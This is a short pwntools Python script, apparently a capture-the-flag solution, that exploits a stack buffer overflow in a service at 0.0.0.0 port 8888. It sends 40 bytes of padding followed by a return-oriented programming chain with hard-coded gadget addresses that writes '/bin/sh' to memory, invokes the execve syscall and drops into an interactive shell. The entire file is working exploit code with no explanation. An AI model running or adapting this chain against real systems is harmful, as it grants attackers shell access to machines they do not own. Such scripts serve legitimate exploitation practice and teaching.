#!/usr/bin/env python

from pwn import *

r = remote('0.0.0.0', 8888)
#context.arch = 'amd64'
context.log_level = 'debug'


#offset = 40

syscall = 0x467265
pop_rsi = 0x4015e7
buf = 0x6ca080
mov_rdi_rsi = 0x47a622
pop_rdi = 0x4014c6
pop_rax_rdx_rbx = 0x478636

offset = 'a'*40
payload = flat([pop_rdi, buf, pop_rsi, "/bin/sh\x00", mov_rdi_rsi, pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0, syscall])

r.recvuntil(':')
r.sendline(offset + payload)
r.interactive()
